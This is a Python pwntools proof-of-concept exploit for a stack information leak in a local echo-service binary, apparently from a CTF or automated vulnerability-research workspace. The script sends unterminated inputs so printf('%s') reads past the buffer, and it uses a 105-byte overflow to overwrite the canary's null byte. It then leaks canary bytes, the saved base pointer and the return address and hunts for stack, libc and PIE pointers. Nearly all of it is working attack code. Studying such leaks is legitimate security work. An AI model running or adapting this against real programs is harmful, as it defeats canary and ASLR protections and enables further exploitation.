#!/usr/bin/env python3
"""
PoC for BUG-002: STACK_INFO_LEAK_VIA_PRINTF

Vulnerability: After read() fills the echo buffer at rbp-0x70 (112 bytes),
the code only null-terminates if buf[read_retval] == 0x0a (newline).
If buf[read_retval] (stack residue) is not 0x0a, the buffer is not null-terminated.
printf("%s", buf) then reads past the input data into stack residue,
leaking stack data.

Stack layout (from buffer start at rbp-0x70):
  offset 0-103:   echo buffer (104 bytes to canary boundary)
  offset 104:     canary LSB = 0x00 (glibc design - null byte)
  offset 105-111: canary bytes 2-8
  offset 112-119: saved rbp (stack pointer)
  offset 120-127: return address (libc/PIE pointer)

PRIM-001: INFO_LEAK (DIRECT)
  - When input < 104 bytes and buf[read_retval] is non-null stack residue,
    printf leaks stack residue between input end and the first null byte.
  - This can leak stack pointers (0x7fff...) from stack residue.
  - Verified: stack address bytes leaked in echo output.

PRIM-002: RELATIVE_READ (INDIRECT - depends on BUG-001 overflow)
  - When input = 105 bytes (no newline), overflow overwrites canary's null LSB.
  - printf then reads past the canary into saved rbp and return address.
  - This leaks the canary (7 remaining bytes), saved rbp, and return address.
  - Verified: canary bytes and stack/libc pointers leaked in echo output.
"""
import sys
import struct
import time
import os

os.environ['PWNLIB_NOTERM'] = '1'
os.environ['TERM'] = 'xterm'

from pwn import *
context.log_level = 'error'

BINARY = "/work/workspace/0009-2021-29-cooldown-20260905-190810/target"

def run_leak_test_precise(length, fill_char=b'A'):
    """
    Send exactly 'length' bytes (no newline) to read(), then "N\n" to scanf.
    
    Key: We must ensure read() only gets 'length' bytes, not "length + N\n".
    Since stdin is unbuffered (_IONBF), read() will return whatever is available.
    We send payload, wait for read() to consume it, then send "N\n" for scanf.
    
    The program flow:
    1. check continue_flag (init 'N') -> enter loop
    2. read(0, buf, 0x100) -> reads from stdin
    3. null-termination check
    4. printf("%s", buf) -> echo output
    5. printf("End?[Y/N] ")
    6. scanf("%7s", &flag) -> reads "N\n"
    7. check continue_flag -> 'N' != 'Y'/'y' -> loop back to step 2
    
    For the leak: we send 'length' bytes, read() returns 'length'.
    Then we wait for "End?[Y/N] " prompt, then send "N\n" for scanf.
    """
    p = process(BINARY)
    try:
        p.recvuntil(b"Welcome to echo service.\n", timeout=3)
        
        # Send exactly 'length' bytes with NO newline
        payload = fill_char * length
        p.send(payload)
        
        # Wait for the echo output + "End?[Y/N] " prompt
        # printf("%s", buf) outputs the buffer content, then printf("End?[Y/N] ")
        data = p.recvuntil(b"End?[Y/N] ", timeout=3)
        
        # echo_output is everything before "End?[Y/N] "
        echo_output = data[:-len(b"End?[Y/N] ")]
        
        # Now send "N\n" for scanf (continue loop)
        p.send(b"N\n")
        
        # Wait a bit then close
        time.sleep(0.1)
        
        leaked = echo_output[length:]
        return echo_output, leaked
    finally:
        p.close()

def find_pointers(data):
    """Find pointer-like values in data."""
    found = []
    for i in range(max(0, len(data) - 7)):
        chunk = data[i:i+8]
        if len(chunk) == 8:
            val = struct.unpack('<Q', chunk)[0]
            if 0x7f0000000000 <= val <= 0x7fffffffffff:
                found.append(('stack/libc', i, val))
            elif 0x550000000000 <= val <= 0x5fffffffffff:
                found.append(('PIE', i, val))
    return found

def main():
    print("=" * 70)
    print("BUG-002: STACK_INFO_LEAK_VIA_PRINTF - Primitive Verification")
    print("=" * 70)
    print()
    
    # ================================================================
    # PRIM-001: INFO_LEAK - Stack residue leak via printf("%s")
    # ================================================================
    print("=" * 70)
    print("PRIM-001: INFO_LEAK (DIRECT) - stack residue leak via printf %s")
    print("=" * 70)
    print()
    print("Mechanism: Send N bytes (no newline). If buf[N] (stack residue) != 0x0a,")
    print("buffer is not null-terminated. printf(%s) reads past input into stack residue.")
    print("Canary null LSB at offset 104 acts as natural barrier for inputs < 105 bytes.")
    print()
    
    prim1_verified = False
    prim1_evidence = []
    
    # Test lengths that should leak stack residue (between input and canary null)
    for length in [8, 16, 32, 64, 96, 100]:
        try:
            echo_output, leaked = run_leak_test_precise(length)
            pointers = find_pointers(leaked)
            
            print(f"  Input len {length:3d}: echo={len(echo_output):3d}B, leaked={len(leaked):3d}B", end="")
            if leaked:
                print(f"  hex={leaked[:24].hex()}")
                if pointers:
                    for ptype, off, val in pointers:
                        print(f"    *** {ptype} POINTER LEAK at leaked[{off}]: 0x{val:016x} ***")
                        prim1_evidence.append(f"len={length}: {ptype} ptr 0x{val:016x}")
                        prim1_verified = True
                else:
                    # Even non-pointer bytes are leaked stack data
                    if len(leaked) > 0:
                        prim1_evidence.append(f"len={length}: {len(leaked)} bytes stack residue leaked: {leaked.hex()}")
                        prim1_verified = True
            else:
                print("  (no leak - buf[N] was null)")
            print()
        except Exception as e:
            print(f"  Input len {length:3d}: ERROR: {e}")
            print()
    
    print(f"--- PRIM-001 Result ---")
    if prim1_verified:
        print(f"=== PRIM-001: VERIFIED ===")
        for ev in prim1_evidence:
            print(f"  Evidence: {ev}")
    else:
        print(f"=== PRIM-001: CANDIDATE ===")
    print()
    
    # ================================================================
    # PRIM-002: RELATIVE_READ - Canary + pointer leak (indirect)
    # ================================================================
    print("=" * 70)
    print("PRIM-002: RELATIVE_READ (INDIRECT) - canary + stack ptr leak")
    print("=" * 70)
    print()
    print("Mechanism: Send exactly 105 bytes (no newline).")
    print("  read() returns 105, writes buf[0..104].")
    print("  buf[104] = canary LSB, overwritten with 0x41 ('A').")
    print("  Code checks buf[105] (canary byte 2) for 0x0a.")
    print("  If not 0x0a, no null-termination. printf reads past canary.")
    print("  Leaks: canary bytes 2-8 (offset 105-111), saved rbp (112-119), ret addr (120-127).")
    print("  INDIRECT: depends on BUG-001 overflow to overwrite canary null LSB.")
    print()
    
    prim2_verified = False
    prim2_evidence = []
    
    # Send exactly 105 bytes - overwrites canary LSB, leaks canary bytes 2-8
    for length in [105, 106, 107, 108]:
        try:
            echo_output, leaked = run_leak_test_precise(length, b'A')
            
            print(f"  Input len {length:3d}: echo={len(echo_output):3d}B, leaked={len(leaked):3d}B", end="")
            if leaked:
                print(f"  hex={leaked[:32].hex()}")
                
                # Data past offset 104 is canary + saved rbp + ret addr
                if len(echo_output) > 104:
                    past_canary = echo_output[104:]
                    print(f"    Past offset 104 (canary+rbp+ret): {past_canary[:24].hex()}")
                    
                    # For length=105: buf[104]=0x41 (overwritten canary LSB)
                    # buf[105..111] = original canary bytes 2-8
                    # buf[112..119] = saved rbp
                    # buf[120..127] = return address
                    if length == 105:
                        canary_bytes_2_8 = echo_output[105:112]
                        saved_rbp = echo_output[112:120] if len(echo_output) >= 120 else b''
                        ret_addr = echo_output[120:128] if len(echo_output) >= 128 else b''
                        
                        print(f"    Canary bytes 2-8 (offset 105-111): {canary_bytes_2_8.hex()}")
                        if saved_rbp:
                            rbp_val = struct.unpack('<Q', saved_rbp)[0] if len(saved_rbp) == 8 else 0
                            print(f"    Saved RBP (offset 112-119): 0x{rbp_val:016x}")
                        if ret_addr:
                            ret_val = struct.unpack('<Q', ret_addr)[0] if len(ret_addr) == 8 else 0
                            print(f"    Return addr (offset 120-127): 0x{ret_val:016x}")
                        
                        # Check for non-'A' bytes in canary region (actual canary data)
                        non_a = [b for b in canary_bytes_2_8 if b != 0x41]
                        if non_a:
                            print(f"    *** CANARY BYTES LEAKED (non-input): {[hex(b) for b in non_a]} ***")
                            prim2_evidence.append(f"len=105: canary bytes 2-8 leaked: {canary_bytes_2_8.hex()}")
                            prim2_verified = True
                        
                        # Check for pointers
                        pointers = find_pointers(past_canary)
                        if pointers:
                            for ptype, off, val in pointers:
                                print(f"    *** {ptype} POINTER at past_canary[{off}]: 0x{val:016x} ***")
                                prim2_evidence.append(f"len={length}: {ptype} ptr 0x{val:016x}")
                                prim2_verified = True
            else:
                print("  (no leak)")
            print()
        except Exception as e:
            print(f"  Input len {length:3d}: ERROR: {e}")
            print()
    
    print(f"--- PRIM-002 Result ---")
    if prim2_verified:
        print(f"=== PRIM-002: VERIFIED ===")
        for ev in prim2_evidence:
            print(f"  Evidence: {ev}")
    else:
        print(f"=== PRIM-002: CANDIDATE ===")
    print()
    
    # ================================================================
    # Summary
    # ================================================================
    print("=" * 70)
    print("FINAL SUMMARY")
    print("=" * 70)
    print()
    print(f"PRIM-001: INFO_LEAK")
    print(f"  Status: {'VERIFIED' if prim1_verified else 'CANDIDATE'}")
    print(f"  Type: DIRECT")
    print(f"  printf(%s) on non-null-terminated buffer leaks stack residue")
    print()
    print(f"PRIM-002: RELATIVE_READ")
    print(f"  Status: {'VERIFIED' if prim2_verified else 'CANDIDATE'}")
    print(f"  Type: INDIRECT (depends on BUG-001 overflow to clear canary null LSB)")
    print(f"  Reads canary bytes + saved rbp + return address past buffer boundary")
    print()

if __name__ == "__main__":
    main()
